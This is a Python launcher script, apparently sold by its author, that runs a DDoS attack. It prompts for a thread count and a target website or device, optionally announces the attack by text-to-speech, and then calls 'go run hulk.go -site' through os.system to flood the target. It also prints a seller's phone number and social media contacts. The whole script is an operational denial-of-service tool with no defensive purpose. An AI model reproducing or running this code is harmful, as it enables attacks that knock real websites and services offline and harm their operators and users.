from colorama import Fore, Back, Style
#print(Fore.RED + 'some red text')
#print(Back.GREEN + 'and with a green background')
#print(Style.DIM + 'and in dim text')
#print(Style.RESET_ALL)
#print('back to normal now')

import os
import pyttsx3
import sys
import platform
def say_stuff(stuff_to_say):
    engine = pyttsx3.init()
    engine.say(str(stuff_to_say))
    engine.runAndWait()
    
 
	
print(Back.GREEN + Fore.BLACK + '[+] NguyenTan Version 1.0                                             ')
print(Back.BLACK +Fore.GREEN + '[+] NguyenTan Tool Interactive Menu in Python by Nguyen Tan                       ')
print(Fore.YELLOW + '[+] Uống nước phải nhớ nguồn, Mua tool ib zalo bên dưới                       ')
print(Fore.GREEN + '[+] Starting NguyenTan DDoS Tool     ')
print(Fore.BLUE + 'Zalo: ' + Fore.GREEN + 'Zalo : 0366591933 (NTT)')
print(Fore.RED + 'Stk: ' + Fore.GREEN + 'Facebook : Nguyen Tan')

print('Your OS:'+ Fore.RED + str(platform.system())+Fore.GREEN)
try:
    threads = input('[+] ENTER THE NUMBER OF' + Fore.BLUE + ' THREADS ' + Fore.GREEN + 'FOR DDoS [ 5000/2000 ] >>>')
    site = input(Fore.BLUE + '[+] Paste link web cần' + Fore.RED + ' DDoS ' + Fore.GREEN + '>>>')
    colab_status = input(Fore.YELLOW + 'Chọn Y [Y/N]')
    attack_severity = input('[+] Enter'+ Fore.RED +' 1'+Fore.GREEN+' For a Very Small'+Fore.RED+' Target'+Fore.GREEN+' Like a Device and' + Fore.YELLOW + ' 2 ' + Fore.GREEN +' for a ' + Fore.YELLOW + 'Website '+ Fore.GREEN + ' >>>')
    if 'Y' == colab_status:
        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'y' == colab_status:
        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'n' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As You are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
    if 'N' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As you are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))

    print('[+] Executing Command as Follows')
    print(Fore.GREEN +'HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
    if 'Windows' in str(platform.system()):
        os.system('go run hulk.go -site {0}'.format(site))
    else:
        os.system('HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
    print(Back.BLACK + Fore.GREEN)
    
except:
    print('[+] Execution Stopped with Error Code 0, Install GoLang or Your Internet is not working properly')
    print('[+] Installing Dependancies')
    os.system('python3 install.py')
    os.system('python install.py')
    os.system('py install.py')

